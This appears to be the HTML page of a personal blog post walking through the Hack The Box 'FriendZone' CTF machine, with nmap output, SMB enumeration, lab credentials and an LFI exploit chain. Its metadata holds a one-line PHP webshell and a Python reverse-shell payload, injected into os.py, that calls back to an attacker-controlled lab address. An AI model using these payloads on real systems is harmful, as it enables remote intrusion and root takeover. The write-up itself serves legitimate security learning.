@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>FriendZone HTB Walkthrough | All Things Cyber – joonkim0625</title>
+<meta name="keywords" content="HTB, FriendZone, SMB, LFI, privilege escalation, python hijack, reverse shell, DNS, enumeration">
+<meta name="description" content="This post covers my process for solving the FriendZone box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.
+References
+
+0xdf’s writeup
+Python library hijack privilege escalation
+
+Recon
+NMAP Scan
+└──╼ [★]$ nmap -sC -sV 10.10.10.123
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 15:01 CDT
+Nmap scan report for 10.10.10.123
+Host is up (0.011s latency).
+Not shown: 993 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
+|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
+|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
+53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Friend Zone Escape software
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+443/tcp open  ssl/http    Apache httpd 2.4.29
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+|_http-title: 404 Not Found
+| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
+| Not valid before: 2018-10-05T21:02:30
+|_Not valid after:  2018-11-04T21:02:30
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   date: 2025-07-03T20:02:08
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: friendzone
+|   NetBIOS computer name: FRIENDZONE\x00
+|   Domain name: \x00
+|   FQDN: friendzone
+|_  System time: 2025-07-03T23:02:09&#43;03:00
+|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.29 seconds
+
+title: FriendZone HTB Walkthrough
+date: 2025-07-03
+categories: [Penetration Testing, CTF Walkthrough, Privilege Escalation, Web Application Security]
+tags: [HTB, FriendZone, SMB, LFI, privilege escalation, python hijack, reverse shell, DNS, enumeration]
+This post covers my process for solving the FriendZone box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.">
+<meta name="author" content="Joon Kim">
+<link rel="canonical" href="https://joonkim0625.github.io/posts/2025-07-03-htb-friendzone/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2025-07-03-htb-friendzone/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2025-07-03-htb-friendzone/">
+  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
+  <meta property="og:title" content="FriendZone HTB Walkthrough">
+  <meta property="og:description" content="This post covers my process for solving the FriendZone box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.
+References 0xdf’s writeup Python library hijack privilege escalation Recon NMAP Scan └──╼ [★]$ nmap -sC -sV 10.10.10.123 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 15:01 CDT Nmap scan report for 10.10.10.123 Host is up (0.011s latency). Not shown: 993 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA) | 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA) |_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Friend Zone Escape software |_http-server-header: Apache/2.4.29 (Ubuntu) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 |_http-server-header: Apache/2.4.29 (Ubuntu) | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time |_http-title: 404 Not Found | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO | Not valid before: 2018-10-05T21:02:30 |_Not valid after: 2018-11-04T21:02:30 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb2-time: | date: 2025-07-03T20:02:08 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\x00 | Domain name: \x00 | FQDN: friendzone |_ System time: 2025-07-03T23:02:09&#43;03:00 |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.29 seconds title: FriendZone HTB Walkthrough date: 2025-07-03 categories: [Penetration Testing, CTF Walkthrough, Privilege Escalation, Web Application Security] tags: [HTB, FriendZone, SMB, LFI, privilege escalation, python hijack, reverse shell, DNS, enumeration] This post covers my process for solving the FriendZone box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-03T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-07-03T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="FriendZone">
+    <meta property="article:tag" content="SMB">
+    <meta property="article:tag" content="LFI">
+    <meta property="article:tag" content="Privilege Escalation">
+    <meta property="article:tag" content="Python Hijack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="FriendZone HTB Walkthrough">
+<meta name="twitter:description" content="This post covers my process for solving the FriendZone box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.
+References
+
+0xdf’s writeup
+Python library hijack privilege escalation
+
+Recon
+NMAP Scan
+└──╼ [★]$ nmap -sC -sV 10.10.10.123
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 15:01 CDT
+Nmap scan report for 10.10.10.123
+Host is up (0.011s latency).
+Not shown: 993 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
+|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
+|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
+53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Friend Zone Escape software
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+443/tcp open  ssl/http    Apache httpd 2.4.29
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+|_http-title: 404 Not Found
+| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
+| Not valid before: 2018-10-05T21:02:30
+|_Not valid after:  2018-11-04T21:02:30
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   date: 2025-07-03T20:02:08
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: friendzone
+|   NetBIOS computer name: FRIENDZONE\x00
+|   Domain name: \x00
+|   FQDN: friendzone
+|_  System time: 2025-07-03T23:02:09&#43;03:00
+|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.29 seconds
+
+title: FriendZone HTB Walkthrough
+date: 2025-07-03
+categories: [Penetration Testing, CTF Walkthrough, Privilege Escalation, Web Application Security]
+tags: [HTB, FriendZone, SMB, LFI, privilege escalation, python hijack, reverse shell, DNS, enumeration]
+This post covers my process for solving the FriendZone box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://joonkim0625.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "FriendZone HTB Walkthrough",
+      "item": "https://joonkim0625.github.io/posts/2025-07-03-htb-friendzone/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "FriendZone HTB Walkthrough",
+  "name": "FriendZone HTB Walkthrough",
+  "description": "This post covers my process for solving the FriendZone box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.\nReferences 0xdf’s writeup Python library hijack privilege escalation Recon NMAP Scan └──╼ [★]$ nmap -sC -sV 10.10.10.123 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 15:01 CDT Nmap scan report for 10.10.10.123 Host is up (0.011s latency). Not shown: 993 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA) | 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA) |_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Friend Zone Escape software |_http-server-header: Apache/2.4.29 (Ubuntu) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 |_http-server-header: Apache/2.4.29 (Ubuntu) | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time |_http-title: 404 Not Found | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO | Not valid before: 2018-10-05T21:02:30 |_Not valid after: 2018-11-04T21:02:30 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb2-time: | date: 2025-07-03T20:02:08 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2025-07-03T23:02:09+03:00 |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.29 seconds title: FriendZone HTB Walkthrough date: 2025-07-03 categories: [Penetration Testing, CTF Walkthrough, Privilege Escalation, Web Application Security] tags: [HTB, FriendZone, SMB, LFI, privilege escalation, python hijack, reverse shell, DNS, enumeration] This post covers my process for solving the FriendZone box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.\n",
+  "keywords": [
+    "HTB", "FriendZone", "SMB", "LFI", "privilege escalation", "python hijack", "reverse shell", "DNS", "enumeration"
+  ],
+  "articleBody": "This post covers my process for solving the FriendZone box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.\nReferences 0xdf’s writeup Python library hijack privilege escalation Recon NMAP Scan └──╼ [★]$ nmap -sC -sV 10.10.10.123 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 15:01 CDT Nmap scan report for 10.10.10.123 Host is up (0.011s latency). Not shown: 993 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA) | 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA) |_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Friend Zone Escape software |_http-server-header: Apache/2.4.29 (Ubuntu) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 |_http-server-header: Apache/2.4.29 (Ubuntu) | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time |_http-title: 404 Not Found | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO | Not valid before: 2018-10-05T21:02:30 |_Not valid after: 2018-11-04T21:02:30 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb2-time: | date: 2025-07-03T20:02:08 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2025-07-03T23:02:09+03:00 |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: , NetBIOS MAC: (unknown) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.29 seconds title: FriendZone HTB Walkthrough date: 2025-07-03 categories: [Penetration Testing, CTF Walkthrough, Privilege Escalation, Web Application Security] tags: [HTB, FriendZone, SMB, LFI, privilege escalation, python hijack, reverse shell, DNS, enumeration] This post covers my process for solving the FriendZone box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.\nReferences 0xdf’s writeup Python library hijack privilege escalation Recon NMAP Scan └──╼ [★]$ nmap -sC -sV 10.10.10.123 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 15:01 CDT Nmap scan report for 10.10.10.123 Host is up (0.011s latency). Not shown: 993 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA) | 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA) |_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Friend Zone Escape software |_http-server-header: Apache/2.4.29 (Ubuntu) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 |_http-server-header: Apache/2.4.29 (Ubuntu) | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time |_http-title: 404 Not Found | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO | Not valid before: 2018-10-05T21:02:30 |_Not valid after: 2018-11-04T21:02:30 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb2-time: | date: 2025-07-03T20:02:08 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2025-07-03T23:02:09+03:00 |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: , NetBIOS MAC: (unknown) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.29 seconds Key findings:\nOpen ports: 21 (FTP), 22 (SSH), 53 (DNS), 80/443 (HTTP/S), 139/445 (SMB/Samba) Notable: FTP, DNS, and multiple SMB shares Feroxbuster feroxbuster -u http://10.10.10.123 Found /wordpress (301), /fz.jpg (200), etc. Possible Wordpress site, Apache, Ubuntu DNS Note:\nFound CN friendzone.red — zone transfer possible.\nAttacks \u0026 Enumeration DNS (Port 53) Tried AXFR on friendzone.red — nothing interesting.\nMissed friendzoneportal.red initially (learned from 0xdf’s writeup).\nSMB/Samba Enumeration (Port 139/445) smbclient -L //10.10.10.123/ -N Found general, Development, and other shares.\nAccessed general share and found creds.txt:\nadmin:WORKWORKHhallelujah@# Tried credentials on SSH, FTP, and SMB shares (only Development was accessible, but empty).\nWeb (443 / Virtual Hosts) HTTPS site is mostly empty, but /js/js/ gives a base64-ish string. Looked for hidden endpoints, found /admin, /wordpress (empty), /js (interesting). Login at administrator1.friendzone.red using the creds works and leads to /dashboard.php. LFI via pagename Param dashboard.php revealed possible Local File Inclusion (LFI) via pagename param:\ndashboard.php?image_id=a.jpg\u0026pagename=timestamp Confirmed LFI by including ../uploads/upload. Getting Source Code Used PHP filters (and LFI) to read source code for dashboard.php, login.php, and upload.php.\nUploading Webshell via SMB Uploaded a webshell to the Development share:\n\u003c?php system($_REQUEST[\"cmd\"]); ?\u003e Triggered the webshell via LFI:\ndashboard.php?image_id=a.jpg\u0026pagename=../../../etc/Development/test\u0026cmd=id Note: cmd=id works as a parameter to the uploaded webshell. Privilege Escalation Found MySQL credentials: db_user=friend db_pass=Agpyu12!0.213$ db_name=FZ Used creds to escalate to local user friend. Used pspy to find root running /opt/server_admin/reporter.py (which imports os). Python library hijack:\nModified /usr/lib/python2.7/os.py to include a reverse shell payload.\nWaited for cron to trigger and got root shell. import pty import socket s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\"10.10.14.6\",443)) dup2(s.fileno(),0) dup2(s.fileno(),1) dup2(s.fileno(),2) pty.spawn(\"/bin/bash\") s.close() Lessons Learned Always enumerate all DNS and virtual hosts; CTFs hide clues everywhere. LFI and file upload vulnerabilities can be chained for RCE. Privilege escalation often involves writable scripts or modules; watch for Python hijacks. Tools like pspy are invaluable for watching root-level cronjobs and processes. Writeup based on my own exploitation process, with inspiration from community writeups.\n",
+  "wordCount" : "976",
+  "inLanguage": "en",
+  "datePublished": "2025-07-03T00:00:00Z",
+  "dateModified": "2025-07-03T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Joon Kim"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://joonkim0625.github.io/posts/2025-07-03-htb-friendzone/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "All Things Cyber – joonkim0625",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://joonkim0625.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      FriendZone HTB Walkthrough
+    </h1>
+    <div class="post-meta"><span title='2025-07-03 00:00:00 +0000 UTC'>July 3, 2025</span>&nbsp;·&nbsp;Joon Kim
+
+</div>
+  </header> 
+  <div class="post-content"><p>This post covers my process for solving the <strong>FriendZone</strong> box on Hack The Box. It demonstrates a typical CTF methodology: recon, enumeration, exploitation (web and SMB), privilege escalation via Python library hijacking, and lessons learned.</p>
+<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
+<ul>
+<li><a href="https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html">0xdf’s writeup</a></li>
+<li><a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">Python library hijack privilege escalation</a></li>
+</ul>
+<h2 id="recon">Recon<a hidden class="anchor" aria-hidden="true" href="#recon">#</a></h2>
+<h3 id="nmap-scan">NMAP Scan<a hidden class="anchor" aria-hidden="true" href="#nmap-scan">#</a></h3>
+<pre tabindex="0"><code>└──╼ [★]$ nmap -sC -sV 10.10.10.123
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 15:01 CDT
+Nmap scan report for 10.10.10.123
+Host is up (0.011s latency).
+Not shown: 993 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
